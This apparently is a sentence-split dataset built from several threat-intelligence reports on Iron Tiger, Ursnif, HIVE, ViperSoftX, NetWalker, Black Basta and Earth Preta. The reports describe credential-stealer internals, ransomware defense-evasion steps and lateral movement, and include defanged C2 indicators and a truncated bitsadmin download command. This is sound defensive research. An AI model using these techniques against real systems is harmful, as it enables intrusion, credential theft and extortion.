            "As seen in the product name identified in the malicious file\u2019s properties, we searched for possible products named \u201ci Talk\u201d but did not find any that could be related to this investigation.",
            "However, we found traces of files from the legitimate Youdu chat application signed by Xinda.im being copied to folders named \u201ci Talk\u201d on one victim\u2019s computer.",
            "This suggests that some chat application named \u201ci Talk\u201d might be repackaging components from the official Youdu client along with malicious executables.",
            "It appears that a chat application was used as a lure to entice the victim into opening the malicious file.",
            "This would be consistent with the tactics, techniques, and procedures (TTPs) of two previous Iron Tiger campaigns from 2020 and 2021: a documented compromise of a chat application widely used by the Mongolian government, and a supply chain attack on Mimi chat, a chat application used in parts of South East Asia. ",
            "Post-exploitation tools We found a custom Chrome password and cookie grabber that appeared unfamiliar, and it was compiled and uploaded in September 2022.",
            "The file was also signed with the VMProtect certificate but it was not obfuscated.",
            "In general, the features were simple; the malware decrypts the saved passwords to a file named \u201cpasswords.txt\u201d, and the cookies to a file named \u201ccookies.txt\u201d. ",
            "Analyzing its details, the malware first parses the \u201cLocal State\u201d file to retrieve the AES key used to encrypt the cookies and passwords.",
            "It then copies the \u201cLogin Data\u201d file to a temporary file \u201cchromedb_tmp\u201d, issues an SQL query to extract the URL, login, and password fields from the file, and then decrypts them and appends the result to the \u201cpasswords.txt\u201d file. ",
            "It proceeds to copy the \u201cCookies\u201d file to a temporary file \u201cchromedb_tmp\u201d, extracts multiple fields from it using an SQL query, and then decrypts the content before copying the result to the \u201ccookies.txt\u201d file.",
            "Some specific cookies related to Google domain names are ignored, probably because they are mostly related to specific Google features or tracking that are considered useless by the threat actor. ",
            "We found two other samples from this stealer: One compilation date indicated an executable built in November 2020, and the other one in December 2021, although those dates could be tampered with.",
            "We found those samples were uploaded on November 2021 and August 2022, meaning this stealer existed since at least late 2021. ",
            "Targeting We identified one gambling company in the Philippines as compromised by this campaign.",
            "Interestingly, the threat actor registered a domain name similar to the company name and used it as a C&C.",
            "This was not surprising as we have noticed this threat actor targeting this industry since 2019 during our Operation DRBControl investigation, and later in 2021 with an update of SysUpdate.",
            "We also attempted to notify the company of this incident through all their listed channels but have received no feedback. ",
            "As stated in the \u201cInfection Vector\u201d section, we noticed the Youdu chat application was probably used as a lure.",
            "It is worth mentioning that the customers mentioned in the Youdu official website are all located inside China, which could be an indicator of the threat actor\u2019s interest in targets related to this country. ",
            "Conclusion This investigation confirms that Iron Tiger regularly updates its tools to add new features and probably to ease their portability to other platforms, verifying the interest we found from this threat actor for Linux or Mac OS.",
            "It also corroborates this threat actor\u2019s interest in the gambling industry and the South East Asia region, as we previously noted in 2020 and 2021. ",
            "This campaign also substantiates the regular usage of chat applications as infection vectors from Iron Tiger.",
            "We expect to find further updates of these tools in the future to accommodate other platforms and apps. ",
            "As an additional warning, we want to highlight that the targeting can be wider than the samples and targeting we have already observed.",
            "In 2022, we discussed a campaign targeting Taiwan and the Philippines that made use of HyperBro samples (detected by Trend Micro as Backdoor.",
            "Win32.HYPERBRO.ENC) signed with a stolen Cheetah certificate.",
            "The BfV, a German governmental entity, published a report in January 2022 mentioning attacks against German companies with HyperBro samples that were also signed with the same certificate.",
            "In October 2022, Intrinsec reported an incident in a French company also using HyperBro samples matching the structure we described in our 2021 investigation.",
            "This shows the threat actor is likely to reuse the tools mentioned here in future campaigns that might target different regions or industries in the short and long term.",
            "Considering the active campaign and regular developments made on this malware family, organizations are advised to enhance and broaden their current and established security measures, and heighten overall vigilance for possible infection vectors that can be abused by this threat group.

            "The DFIR Report url: https://thedfirreport.com/2023/01/09/unwrapping-ursnifs-gifts/ In late August 2022, we investigated an incident involving Ursnif malware, which resulted in Cobalt Strike being deployed.",
            "This was followed by the threat actors moving laterally throughout the environment using an admin account. ",
            "The Ursnif malware family (also commonly referred to as Gozi or ISFB) is one of the oldest banking trojans still active today.",
            "It has an extensive past of code forks and evolutions that has lead to several active variants in the last 5 years including Dreambot, IAP, RM2, RM3 and most recently, LDR4. ",
            "For this report, we have referred to the malware as Ursnif for simplicity, however we also recommend reading Mandiant\u2019s article on LDR4. ",
            "Case Summary In this intrusion, a malicious ISO file was delivered to a user which contained Ursnif malware.",
            "The malware displayed an interesting execution flow, which included using a renamed copy of rundll32.",
            "Once executed, the malware conducted automatic discovery on the beachhead host, as we have observed with other loaders such as IcedID.",
            "The malware also established persistence on the host with the creation of a registry run key. ",
            "Approximately 4 days after the initial infection, new activity on the host provided a clear distinction of a threat actor performing manual actions (hands on keyboard).",
            "The threat actor used a Background Intelligent Transfer Service (BITS) job to download a Cobalt Strike beacon, and then used the beacon for subsequent actions. ",
            "The threat actor first ran some initial discovery on the host using built-in Windows utilities like ipconfig, systeminfo, net, and ping.",
            "Shortly afterwards, the threat actor injected into various processes and then proceeded to access lsass memory on the host to extract credentials. ",
            "Using the credentials extracted from memory, the threat actors began to move laterally.",
            "They targeted a domain controller and used Impacket\u2019s wmiexec.py to execute code on the remote host.",
            "This included executing both a msi installer for the RMM tools Atera and Splashtop, as well as a Cobalt Strike executable beacon.",
            "These files were transferred to the domain controller over SMB. ",
            "After connecting to the Cobalt Strike beacon on the domain controller, the threat actor executed another round of discovery tasks and dumped lsass memory on the domain controller.",
            "Finally, they dropped a script named adcomp.bat which executed a PowerShell command to collect data on computers in the Windows domain. ",
            "The following day, there was a short check-in on the beachhead host from a Cobalt Strike beacon, no other activity occurred until near the end of the day.",
            "At that time, the threat actor became active by initiating a proxied RDP connection via the Cobalt Strike beacon to the domain controller.",
            "From there, the threat actor began connecting to various hosts across the network. ",
            "One host of interest was one of the backup servers, which was logged into, the state of backups were checked and running processes were reviewed before exiting the session.",
            "The threat actor was later evicted from the network. ",
            "Services We offer multiple services including a Threat Feed service which tracks Command and Control frameworks such as Cobalt Strike, BumbleBee, Covenant, Metasploit, Empire, PoshC2, etc.",
            "More information on this service and others can be found here. ",
            "The Cobalt Strike server in this case was added to our feed on July 18, 2022, over 2 months before it was used in this case. ",
            "We also have artifacts and IOCs available from this case such as pcaps, memory captures, files, and event logs including Sysmon under our Security Researcher and Organization services. ",
            "Timeline Analysis and reporting completed by @_pete_0, @svch0st and UC1. ",
            "Initial Access In this case, the Ursnif malware was delivered using a very familiar technique of being contained within an ISO file. ",
            "The DFIR Report has previously reported on several incidents that involved the tactic of delivering malicious flies using ISO files: As we have previously highlighted, the Event Log Microsoft-Windows-VHDMP-Operational.evtx contains high confidence evidence when users mount ISO files.",
            "We recommend looking for these events (especially Event ID\u2019s 1, 12 & 25) in your environment and checking for anomalies. ",
            "In this case, the user had saved the file 3488164.iso to the their downloads folder and mounted it. ",
            "Once mounted, the new drive contained a LNK file 6570872.lnk and hidden folder \u201cme\u201d. ",
            "If we parse this LNK file with LECmd (by Eric Zimmerman), it highlights the execution path and the icon it appears as: The contents of hidden folder \u201cme\u201d, included several files and folders that were used for the execution of Ursnif.",
            "Of interest, the folder included a legitimate copy of rundll32.exe (renamed to 123.com). ",
            "Summary of the files found in 3488164.iso (a detailed break down of these can be found in Execution): File Name Purpose 6570872.lnk LNK file that executes alsoOne.bat me/by Empty folder me/here Empty folder me/123.com Renamed legitimate version of rundll32.exe me/alsoOne.bat Batch script to run canWell.js with specific arguments me/canWell.js Reverses argument strings and executes tslt.db with 123.com me/itslt.db Ursnif DLL or.jpg Image not used.

            "Since mid-February, observations of Qakbot delivery via OneNote has faded in our telemetry while use of ISO image files has returned.",
            "The absence of OneNote malware in our telemetry suggests the technique is finding less success in circumventing perimeter gateways and content filters.",
            "The diminished use of OneNote by Qakbot during the week of February 20th is corroborated by public mentions (1, 2, 3) of ISO images in lieu of the aforementioned file type. ",

            "In addition to those techniques, the actor employed a number of previously unseen techniques designed to to drop the defenses of the victim, inhibit monitoring, disable networking and allow time for the ransomware to finish encrypting files.",
            "These extra steps would make it extremely difficult, if not impossible, for a victim to effectively use their security tools to defend endpoints after a certain point in the attack.",
            "Rapid7 has updated existing and added new detections to InsightIDR to defend against these techniques.",
            "In this article, we\u2019ll explore the techniques employed by the threat actor, why they\u2019re so effective, and how we\u2019ve updated InsightIDR to protect against them.",
            "What approach did the malicious actor take to prepare the victim's environment?Initially using Cobalt Strike, the malicious actor retrieved system administration tools and malicious payloads by using the Background Intelligent Transfer Service (BITSAdmin).\"C:\\Windows\\system32\\bitsadmin.exe\" /transfer",

            "This can be especially effective if timed with deployments of patches that require a reboot, done at the beginning of the day or even remotely using Powershell's Stop-Computer cmdlet.",
            "Storing the ransomware within a 7zip encrypted archive (int.7z) with a password even as simple as (123) makes the task of identifying the ransomware on disk or transmitted across the network nearly impossible.",
            "This makes retrieval and staging of the malicious actors payload very difficult to spot by security software or devices (Antivirus, Web Filtering, IDS/IPS and more).",
            "In this case, the malicious actor has taken care to only put the encrypted copy on the disk of a victim\u2019s system and not execute it until they have fully dropped the defenses on the endpoint.",
            "Reconfiguring the default boot behavior to safeboot minimal and then executing a reboot unloads all but the bare minimum for the Windows operating system.",
            "With no additional services, software or drivers loaded the system is at its most vulnerable.",
            "With no active defenses (Antivirus or Endpoint Protection) the system comes up and tries to start its defined shell which has been swapped to a batch script (file2.bat) by the malicious actor.",
            "It should be noted that in this state, there is no method of remotely interacting with the system as no network drivers are loaded.",
            "In order to respond and halt the ransomware, each host must be physically visited for shutdown.",
            "Manually priming the host in this way is more effective than the existing capabilities of the HIVE ransomware which stops specific defensive services (Windows Defender, etc) and kills specific processes prior to encrypting the contents of the drive.",
            "All systems in this state are left automatically logged in as an administrator, which gives anyone who has physical access complete control.",

            "Systems they executed with only the -u flag actively searched out network shares they had access to and encrypted their contents.",
            "This ensures that only the intended hosts do network share encryption and all those that were rebooted into safeboot minimal do not flood the network simultaneously encrypting all files.",
            "It also means that the contents of network file shares that are not Windows based (various NAS devices, Linux hosts using Samba) will be encrypted even if the payload is not actually deployed on that specific host.",
            "This approach would be extremely destructive to both corporate environments and home users with network attached storage systems for backups.",
            "Rapid7 notes that ThreatLocker have reported on similar activity in their knowledge base article entitled Preventing BCDEdit From Being Weaponized.",
            "Malware analysis of HIVE sampleRapid7 observed that the HIVE payload would not execute unless a flag of -u was passed.",
            "During analysis it was discovered that passing -u asdf:asdf would result in the Login and Password (colon-delimited) provided to the victim to authenticate to the site behind the onion link on the TOR network:This, and other behaviors were previously reported on by Microsoft's article Hive Ransomware Gets Upgrades in Rust and also by Sophos in their Github Repository of IoC's mentioned in their article Lockbit, Hive, and BlackCat attack automotive supplier in triple ransomware attack.",
            "There have been some flags that are noted to exist, but their features are not documented.",
            "Rapid7 has analyzed the behaviors of these flags, documented them in addition to discovering two new flags (-timer, -low-key) in the HIVE ransomware samples.",
            "The new flags -t, -timer, --timer effectively cause the malware to wait the specified number of seconds before going on to perform its actions.",
            "The other new flags -low-key, --low-key will cause the ransomware to focus on only its encryption of data and not perform pre-encryption tasks, including deleting shadow copies (malicious use of vssadmin.exe, wmic.exe), deleting backup catalogs (malicious use of wbadmin.exe), and disabling Windows Recovery Mode (malicious use of bcdedit.exe).",
            "These features give the malicious actor more control over how/when the payload is executed and skirt common methods of command line and parent/child process related detection for most ransomware families.",
            "Fundamentally, the sample\u2019s respective flags distill down into encryption operations of local, mount and discovery. ",
            "The local module utilizes the LookupPrivilegeValueW and AdjustTokenPrivileges that Windows API calls on its own process via GetCurrentProcess and OpenProcessToken to obtain SeDebugPrivilege privileges. ",
            "This is presumably crucial for OpenProcess -> OpenProcessToken -> ImpersonateLoggedOnUser API call attempts to processes: winlogon.exe and trustedinstaller.exe to subsequently stop security services and essential processes, if the --low-key is not passed during execution. ",
            "ShellExecuteA is also used to launch various Windows binaries (bcdedit.exe, notepad.exe, vssadmin.exe, wbadmin.exe, wmic.exe) for destruction of backups and ransom note display purposes.",
            "The mount module will use NetUseEnum to identify the current list of locally-mounted network shares and add them to the list to be encrypted.",
            "Lastly, the discovery module will use NetServerEnum to identify available Windows hosts within the domain/workgroup.",
            "This list is then used with NetShareEnum to identify file shares on each remote host and add them to the list of locations to have their files encrypted.",
            "By default, all three modes (local, mount and discovery)are enabled, so all local, mounted and shares able to be enumerated will have their contents encrypted.",
            "This effectively ransoms all systems in a victim\u2019s environment with a single execution of HIVE\u2014when performed by a privileged user such as a Domain or Enterprise Admin account.",
            "Command line flags may be used to change this behavior and invoke one or more of the modules.",

            "We also noted more sophisticated encryption and basic anti-analysis techniques, such as byte remapping and web browser communication blocking. ",
            "By: Don Ovid Ladores April 24, 2023Read time: ( words) Save to Folio Subscribe ViperSoftX, a type of information-stealing software, has been primarily reported as focusing on cryptocurrencies, making headlines in 2022 for its execution technique of hiding malicious code inside log files.",
            "Since it was first documented in November, we observed this malware campaign differentiating itself from its previous iteration with the use of DLL sideloading for its arrival and execution technique.",
            "We also noted that this update includes a more sophisticated encryption method of byte remapping and a monthly change in command-and- control (C&C) server.",
            "Without the correct byte map, the encrypted shellcode, including all components and relevant data, cannot be correctly decrypted, making decryption and analysis of the shellcode more time-consuming for analysts. ",
            "We\u2019ve noted a significant number of victims in the consumer and enterprise sectors, with Australia, Japan, and the United States as the top three countries affected by ViperSoftX in the consumer category.",
            "Meanwhile, victim organizations from Southeast Asian countries comprised the enterprise sector. ",

            "In blocking and detecting these illicit software solutions, we have come to believe that the people behind these kinds of software try to convince users looking for bootleg software versions that these are not malicious and are simply flagged as \u201cfalse positives.\u201d",
            "It is also a common gimmick for cybercriminals to pose malware as a keygen or an activator.",
            "Actors behind ViperSoftX take this narrative a step further by using actual non-malicious software to hide and pose as typical illegal software versions.",
            "ViperSoftX uses these files as \u201ccarriers\u201d of the main malware encrypted within the overlay. ",
            "While the malicious actors abuse neither definitive software nor target any definitive applications, they commonly use multimedia editors or video format converters, cryptocurrency coinminer apps, phone-related desktop apps, and system cleaner apps.",

            "For the most part, the malware is posed as a software activator, patcher, or keygen, among other similar software executables.",
            "The malicious routine starts after the software executables have been included and run in the system. ",
            "We also noticed that ViperSoftX\u2019s primary C&C servers for the second stage download would change on a monthly basis: ",

            "If all checks pass, the malware proceeds to decrypt the PowerShell code and starts downloading the main ViperSoftX routine.",
            "From there, the routine is its standard multistage download and execution routine. ",

            "Execution of the first-stage PowerShell downloader after passing through blacklisting Unique encryption Byte mapping is a considerably simple technique.",
            "It does not require any complex computations, and the only operation it requires is to put the correct byte in the correct location.",
            "For their part, cybercriminals benefit from this malware as it reduces the presence and actions made by a large graph of objects. ",
            "Unlike the typical bitwise operations from typical decryption routines, ViperSoftX uses byte remapping to ensure that the shellcode cannot be easily decrypted without the correct byte map, weaving a cross-stitch template to the palette of 256 (0x100h) bytes.",
            "Though this is a very rigid method of hiding its codes, it provides some level of protection against forced decryption. ",
            "Figure 5.",
            "Comparison of two ViperSoftX carrier executables with byte remapping. ",
            "Note: The bytes of the encrypted section is a specific index on the byte map found in the sideloaded DLL.",
            "Comparing the mapping of the first four bytes on two samples shows that their offsets within the encrypted region remain the same since they result in a similar shellcode even if they are composed of different bytes per binary. ",
            "When the screenshots of the two carrier executables are compared, the number (or code) changed but the location/offset remains the same.",
            "The same is true for all the other bytes.",

            "If this pattern is a text or a string, it would not be difficult to apply brute force.",
            "However, considering this is a byte character (with 256 different bytes) and an assembly code instruction at that, brute-forcing it would unlikely yield correctly decrypted results. ",
            "We have also found that each sideloader DLL has its own pair of executable and byte map, and a decryption attempt returns an incorrectly rearranged shellcode if used with another ViperSoftX-related executable.",
            "This ensures that the shellcode will not be decrypted without the correct DLL since the latter contains the correct byte map.",
            "Moreover, all the strings, binaries, and other relevant data within the ViperSoftX DLL also gets decrypted the same way.",
            "Afterward, the shellcode will then decrypt and load the main ViperSoftX DLL embedded within the carrier. ",

            "Considering the former is a type of script malware, however, this technique for encryption-decryption is easily more discernable during analysis because both the encrypted data and the mapping are in the same file.",
            "In contrast to our ViperSoftX sample, which is a full binary file, the table becomes harder to find.",
            "Furthermore, since the data to be decrypted is in another file, the routine becomes even more difficult to investigate, as analysts would need the correct pair for decryption. ",
            "Password theft Since it was first documented, ViperSoftX has been known as a cryptocurrency stealer.",
            "However, we found from our investigations that ViperSoftX can check not only for cryptocurrencies but also for a few password managers.",

            "It is also notable that the leading countries and regions affected by the malware campaign are Australia and Japan with almost the same numbers, while US came at a close third with almost half as much victims at the consumer level.",

",
            "The cybercriminals behind ViperSoftX are also skilled enough to execute a seamless chain for malware execution while staying under the radar of authorities by selecting one of the most effective methods for delivering malware to consumers.",
            "Although we have observed some changes throughout their campaigns, the pace of ViperSoftX\u2019s development can be considered slow compared to other types of stealer malware. ",
            "The group behind this malware has been doing this for a number of years, and it knows its target systems based on the simultaneous use of techniques to steal cryptocurrencies and passwords.",
            "In this respect, we believe there are actually at least two groups responsible for this ViperSoftX campaign based on the malware\u2019s C&C communication.",
            "As the first set of players, the main group is responsible for the deployments.",
            "On the other hand, considering the monthly change of C&C servers and communication exchange, we believe in the possibility of another group involved based on the different coding or C&C scheme.",
            "ViperSoftX uses a domain-generating algorithm (DGA) to hide its C&C server and generate useless traffic.",
            "From the DGA technique, we observed that majority of the activities are dominated by the main group, which utilizes a simple DGA.",
            "However, there are a number of activities that appear to use a different DGA.",
            "We do not discount the possibility that these can either be older samples or different operators entirely. ",
            "While ViperSoftX appears to be targeting consumers considering its chosen means for entry, we found it interesting that it also affects the business sector.",
            "One possible theory behind why businesses are affected by this campaign has to do with recent layoffs and possible budget cuts.",
            "While some users might be looking to freelance and upend their incomes while in between jobs, others might have been prompted to download tools from unofficial platforms to \u201csave costs\u201d and circumvent tools not found in office-issued devices.",
            "Nonetheless, we strongly recommend that users download the software and applications they need from official platforms.",

            "Since then, new variants were discovered throughout 2019 and the beginning of 2020, with a strong uptick noticed in March of this year.",
            "NetWalker has noticeably evolved to a more stable and robust ransomware-as-a-service (RaaS) model, and McAfee research suggests that the malware operators are targeting and attracting a broader range of technically advanced and enterprising criminal affiliates.",
            "McAfee Advanced Threat Research (ATR) discovered a large sum of bitcoins linked to NetWalker which suggest its extortion efforts are effective and that many victims have had no option other than to succumb to its criminal demands.",
            "For more details on NetWalker, see the McAfee ATR blog here. ",
            "We do not want you to be one of those victims, so this blog is focused on how to build an adaptable security architecture to defeat this threat and, specifically, how McAfee\u2019s portfolio delivers the capability to prevent, detect and respond to NetWalker ransomware. ",
            "Gathering Intelligence on NetWalker As always, building adaptable defensive architecture starts with intelligence.",
            "In most organizations, the Security Operations team is responsible for threat intelligence analysis, as well as threat and incident response.",
            "The Preview of McAfee MVISION Insights is a sneak peek of some of MVISION Insights capabilities for the threat intel analyst and threat responder.",
            "The preview identifies the prevalence and severity of select top emerging threats across the globe which enables the Security Operations Center (SOC) to prioritize threat response actions and gather relevant cyber threat intelligence (CTI) associated with the threat, in this case NetWalker ransomware.",
            "The CTI is provided in the form of technical Indicators of Compromise (IOCs) as well as MITRE ATT&CK framework tactics and techniques. ",
            "As a threat intel analyst or responder, you can drill down to gather more specific information on NetWalker, such as prevalence and links to other sources of information. ",
            "As a threat intel analyst or responder, you can further drill down to gather more specific actionable intelligence on NetWalker, such as indicators of compromise and tactics/techniques aligned to the MITRE ATT&CK framework. ",
            "From MVISION Insights preview, you can see that NetWalker leverages tactics and techniques common to other ransomware attacks, such as spear phishing attachments for Initial Access, use of PowerShell for deployment, modification of Registry Keys/Startup folder for persistence and encryption of files for impact of course. ",
            "Defensive Architecture Overview Today\u2019s digital enterprise is a hybrid environment of on-premise systems and cloud services with multiple entry points for attacks like NetWalker.",
            "The work from home operating model forced by COVID-19 has only expanded the attack surface and increased the risk for successful ransomware attack if organizations did not adapt their security posture.",
            "Mitigating the risk of attacks like NetWalker requires a security architecture with the right controls at the device, on the network and in security operations (sec ops).",
            "The Center for Internet Security (CIS) Top 20 Cyber Security Controls provides a good guide to build that architecture.",
            "For ransomware, and NetWalker in particular, the controls must be layered throughout the enterprise.",
            "The following outlines the key security controls needed at each layer of the architecture to protect your enterprise against ransomware. ",
            "To assess your capability against NetWalker, you must match your existing controls against the attack stages we learned from the Preview of MVISION Insights.",
            "For detailed analysis on the NetWalker ransomware attack, see McAfee ATR\u2019s blog but, for simplicity, we matched the attack stages to the MITRE ATT&CK Framework below. ",

            "title: Technical Analysis: Black Basta Malware Overview url: https://quadrantsec.com/resource/technical-analysis/black-basta-malware-overview INTRODUCTION Quadrant was recently able to aid a client during an organization wide compromise by the Black Basta ransomware group.",
            "This group is a \u201cRansomware as a Service\u201d (RaaS) organization known to target medium and large companies.",
            "The following contains an overview of the compromise as it progressed, as well a technical analysis of the malware and techniques observed, ranging from a successful phishing campaign to the attempted ransomware detonation.",
            "Although some exact details of the threat actor\u2019s actions are still unknown, the evidence gathered has allowed for inferences into many of the gaps.",
            "The names of all clients, all accounts, and some files have been modified for client confidentiality.",
            "Indicators of compromise, including malicious domain names, have not been modified.",
            "Any log modification has been made to redact client information, break potential links, or for readability. ",
            "RELATED TO THIS STORY ",
            "The timeline below shows a high-level overview of the incident: INITIAL ACCESS The Threat Actor began this attack by compromising a user account at a third-party vendor (TPV).",
            "Although little is known to Quadrant about the compromise on the TPV, access allowed for the use of an \"info@\" account.",
            "The use of such an account would have allowed the Threat Actor to pose as the compromised user without creating extra \"junk\" in the user's inbox which could raise suspicion.",
            "Following initial phishing emails, the threat actor continued to submit additional phishing emails to the client via similar account names from different domains.",
            "Both samples reached their victims shortly after noon on the 20th of September ",
            "The phishing emails contained what was later determined to be \"Qakbot,\" a sophisticated trojan.",
            "Following the infection, these hosts began to beacon on out to over 100 IP's using various ports.",
            "The client\u2019s Cisco \u201cAdvanced Malware Protection\u201d (AMP) detected a connection with one of these IP's over TCP port 2222.",
            "Although this did trigger an alert in AMP, the Quadrant ingestion of these logs was not configured, so this did not generate an alert through the Sagan Solution. ",
            "The Suricata engine did detect these connection attempts, however no alert was raised by the Packet Inspection Engine.",
            "Quadrant monitors companies' ingress and egress traffic using onsite Packet Inspection Engine (PIE) appliances running the Suricata Detection engine.",
            "Although many other rulesets are used to screen for malicious activity, Quadrant has custom rules in place to detect SSH over nonstandard ports, such as TCP 2222.",
            "These rules did not fire due to the absence of an SSH header in the traffic.",
            "One may assume that traffic over 2222 would be SSH traffic, however further analysis of the traffic generated by the Qakbot Sample in the lab shows that this connection was likely HTTPS in nature. ",
            "Eventually, the malware was able to find an active C2 server.",
            "It took about 35 minutes between initial infection and the first successful communication between a compromised host and the C2 domain.",
            "The second stage payload, which was later determined to likely be the penetration testing framework \"Brute Ratel,\" was then downloaded via a connection to an IP from Russia. ",
            "PERSISTENCE AND ESCALATION OF PRIVILEGE Following the compromise of two hosts and gaining a foot hold, lateral movement began.",
            "The client's full infrastructure is comprised of three domains: Construction, Commerce, and a Subsidiary.",
            "Both initial compromised hosts were in the Construction environment.",
            "These domains had shared trust and were connected via VPN tunnels which allowed the threat actor to move freely between domains. ",
            "We believe that multiple methods and tools were leveraged in order to do this.",
            "At this point, visibility becomes muddled due to the focus of observation and detection is ingress and egress traffic.",
            "However, following the investigation into the recorded logs and the follow-on detailed analysis of malware samples, we can make educated guesses on some of the missing pieces. ",
            "Initial lateral movement and the lay of the land was likely conducted using Brute Ratel.",
            "This was determined through a review of files found on one of the initially compromised hosts.",
            "One file, \"zfgufgfvezdnbcvjkzctpvfdj.dll,\" matches the hash of previously submitted Brute Ratel samples. ",
            "Due to the lack of visibility, we were unable to find the initial connection from the two \"Patient Zeros\" to the local Domain Controller.",
            "However, after reaching the local DC, the attacker was able to gain a better lay of the land and observe the presence of the other two domains. ",
            "Initial Command and Control was conducted from \"23[.]19[.]58[.]43\"[zedorocop[.]com] and \"23[.]106[.]160[.]141\" [danimos[.]com].",
            "The IP\u2019s used for C2 and the level of interaction changed over time as the compromise grew. ",
            "For example, mid-stage infections showed calls to \"146[.]70[.]86[.]44\"[gerhiles[.]com].",
            "It\u2019s important to note that the FQDN\u2019s that were used as C2 were all registered the same month as the compromise. ",
            "Multiple administrative and system accounts were compromised during this incident.",
            "One possible explanation for this comes from \u201cKerberoasting\u201d.",
            "This technique was observed in the Commerce environment through a sharp incline of Kerberos requests using RC4 encryption.",
            "We do not believe that this was successful in this environment, due in part to the lack of additional signs of compromise specific to this Domain.",
            "However, this technique was likely performed on the other two client domains where visibility gaps existed.",
            "This is further supported by the source and destination of these requests were cross domain: The source of the \u201cKerberoasting\u201d was based in the Subsidiary environment and the Domain Controller that was attacked was in the Commerce environment. ",
            "Once administrative access had been achieved, the threat actor also added new administrative accounts to the environment. ",
            "PROPAGATION Unknown to everyone but the attacker, multiple files were being transmitted throughout the environment: Two file names were observed during the incident \"Client_s.exe\" and \"Client.exe.\"",
            "It is expected that the different naming schemes are related to the different variations of the Black Basta ransomware.",
            "Although no sample was able to be provided for the Client.exe (which is believed to be the ESXi variant), Quadrant was able to obtain a copy of \"Client_s.exe\" for Windows hosts. ",
            "Two \".bat\" files were sent throughout the organization.",
            "Both were designed to turn off antivirus and anti-malware software.",
            "One does not use any obfuscation and just contains the simple command to stop Cisco AMP Orbital.",
            "This could indicate that it was written hastily in order to get it onto the target environments quickly.",
            "The other, targeting Windows Defender, required multiple steps in order to view the commands. ",
            "Tox5, which appeared to be a component of Cobalt Strike, as well as Cobalt Strike beacon with the name of \"Ticket-5731.xls.\" These files continued to replicate throughout the organization though the use of Server qMessage Block (SMB), eventually spreading to almost every endpoint and server in two of the three domains.",
            "The attack on the Commerce domain does not appear to have been effective, outside of one host in a training environment.",
            "Most hosts in the Commerce environment HAD more restrictions placed on their operating system by default which likely contributed to the lack of success by the threat actors in the Commerce environment. ",
            "EXFILTRATION ",
            "Once a file server was identified, an FTP connection was established to an external site.",
            "This was not used for C2 activities but only for receiving the exfiltrated data.",
            "Suricata logs show that \u201cRClone\u201d was downloaded on the file servers in order to facilitate exfiltration of the logs.",
            "RClone is designed to transfer large volumes of data from one host to the cloud with ease.",
            "This legitimate program was abused by the attacker to steal client data. ",
            "DETECTION AND RESPONSE The most critical asset of the Security Operations Center is the human SOC Analyst. ",
            "A human can look at the totality of a situation and make a judgement call that no AI or automated process can.",
            "From the analyst's perspective, the only alert that was generated and brought to the SOC was a Suricata FTP rule looking for CVE 1999-0911, related to an overflow using the MKD command.",
            "This FTP command is defined as \"...causes the directory specified in the pathname to be created on the server.",
            "If the specified directory is a relative directory, it is created in the client's current working directory.",
            "\" Although many old signatures are decommissioned or otherwise suppressed, Quadrant leaves some rules in place as \"hunting\" rules.",
            "These are more focused on the overall techniques or \"odd\" traffic that could be an indicator of compromise.",
            "In this case, the analyst investigating the alert observed that this was technically a False Positive, as the command was not used in an abnormal fashion.",
            "However, looking at the destination, which had not been previously observed in the environment, the file names (which were quite varied), and the volume of the files outbound, the analyst decided to call the client to err on the side of caution.",

            "By: Trend Micro March 27, 2023Read time: ( words) Save to Folio Subscribe Since 2022, we\u2019ve been following a series of cyberespionage efforts carried out by multiple groups carried from an old campaign.",
            "It combines the collective activities carried out by subgroups of advanced persistent threat (APT) group Earth Preta (also known as Mustang Panda), representing a comprehensive network of operations for gathering sensitive information from various entities.",
            "An analysis of their deployments also revealed a level of coordination and collaboration. ",
            "Through extensive analysis and as of this writing, we discovered over 200 victims, leading to a wider intelligence analysis of the groups\u2019 goals, different operation groups, and tactics, techniques, and procedures (TTPs).",
            "Our study aimed at understanding the different phases and facets involved in this operation, shedding light on the motives and techniques used by Earth Preta to provide valuable insights and aid in the development of effective countermeasures. ",
            "Key findings While not exhaustive of the entire study\u2019s findings due to security and confidentiality concerns, we determined the following findings key to the entire research: ",
            "A hierarchical structure. ",
            "Earth Preta has a centralized development unit that produces the implants and tools, and disseminates them to other operational groups responsible for penetration and implantation.",
            "This is evident in the Earth Preta group as it appears that multiple sub-operational groups use the same toolset with different techniques. ",
            "A management of expertise.",
            "The different operational groups manage their own methods of entry and privilege escalation, demonstrating a high degree of specialization within each group. ",
            "A change in targets.",
            "Towards the end of 2022, there were changes in how information was collected.",
            "The latest active targets were related to maritime, shipping, border control, and immigration agencies.",
            "Prior to this shift, most of the data collection efforts were aimed at academic institutions, ore and material refineries, specialized fabrication plants, financial institutions, and energy production and distribution. ",
            "These key findings can help intelligence communities and decision-makers in understanding Earth Preta\u2019s capabilities, objectives, and impact on international security and intellectual property.",
            "With this entry, we hope to emphasize the importance of international cooperation in combating this significant threat. ",
            "Method and findings We found that some operational part of the collective group were focused on stealing intellectual property and sensitive business information, while others targeted government and diplomatic entities.",
            "We also found the operations having specific geographical regions for which they tailored their collection requirements. ",
            "Figure 1.",
            "Earth Preta\u2019s top 10 targeted industries We used a qualitative approach to identify the collection requirements, methods, and objectives of the operational groups and their respective places in the organization.",
            "We established links between the operational threat groups by grouping overlaps in victimology and identifying core indicators, such as implants or payloads. Figure 2.",
            "Earth Preta\u2019s targeted regions Case studies Overlaps Throughout our investigation, we observed several instances where victims were compromised by two groups simultaneously, indicating possible overlaps in collection requirements between these groups.",
            "While there are no indications of overlaps in individual devices, there are strong indications of targets intersecting, suggesting these groups are pursuing similar objectives.",
            "Additionally, the overlaps among victims indicate a lack in targeting coordination and/or planning within the overall groups' leadership or management. ",
            "These targeting overlaps have been observed in multiple groups, such as Groups 724, 1358, and 5171.",
            "Since these groups operate across a variety of sectors, it is likely that the overlap in collection requirements is the result of similar objectives rather than coordination between the toolset and collected materials.",
            "However, we have not been able to identify any evidence of coordination between these groups or a shared toolset. ",
            "Infection and exfiltration vectors Group 5171's exfiltration methods are sophisticated and designed to avoid detection.",
            "Several victims in key countries, such as Singapore, Vietnam, Netherlands, Ghana, and Myanmar, have indications of files exfiltrated via a dedicated USB mass storage device.",
            "For instance, in January 2023, a device from Vietnam loaded the Adobe CEF Helper under the path <C:\\Users\\XXX\\AAM",
            "UpdatesXXX\\AAM Updates.exe>",
            "and exfiltrated documents to drive F:.",
            "The same device also carried out another collection in December 2022, where data was copied from folder <C\\:$RECYCLE.BIN\\S-XXXXX$XXXH.pdf>, indicating that the user deleted the collected data. ",

